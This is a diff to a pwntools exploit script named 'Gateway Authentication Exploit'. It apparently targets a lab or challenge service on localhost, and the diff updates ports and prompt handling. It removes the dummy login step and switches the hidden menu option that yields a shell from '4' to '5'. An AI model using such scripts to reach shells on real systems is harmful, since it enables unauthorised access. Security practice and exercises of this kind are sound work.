@@ -11,7 +11,7 @@ from collections import defaultdict
 context.log_level = 'info'
 
 class GatewayExploit:
-    def __init__(self, host='localhost', port=24963, session_id=None):
+    def __init__(self, host='localhost', port=26325, session_id=None):
         self.host = host
         self.port = port
         self.session_id = session_id
@@ -32,19 +32,11 @@ class GatewayExploit:
         try:
             conn = remote(self.host, self.port)
             
-            # Id 입력 대기
-            conn.recvuntil(b'Id:')
-            conn.sendline(b"a")
-            
-            # Password 입력 대기  
-            conn.recvuntil(b'Password:')
-            conn.sendline(b"a")
-            
             # 메뉴 출력 대기
-            conn.recvuntil(b'Choice: > ')
+            conn.recvuntil(b'Choice: ')
             
             # 4번 선택 (숨겨진 옵션)
-            conn.sendline(b"4")
+            conn.sendline(b"5")
             
             # 쉘 접근 성공
             time.sleep(0.5)
@@ -548,7 +540,7 @@ def main():
     
     parser = argparse.ArgumentParser(description='Gateway Authentication Exploit')
     parser.add_argument('--host', default='localhost', help='Target host')
-    parser.add_argument('--port', type=int, default=27708, help='Target port (from API response)')
+    parser.add_argument('--port', type=int, default=26325, help='Target port (from API response)')
     parser.add_argument('--session', default='session_1750043538_9512', help='Session ID (from API response)')
     parser.add_argument('--debug', action='store_true', help='Enable debug logging')
     
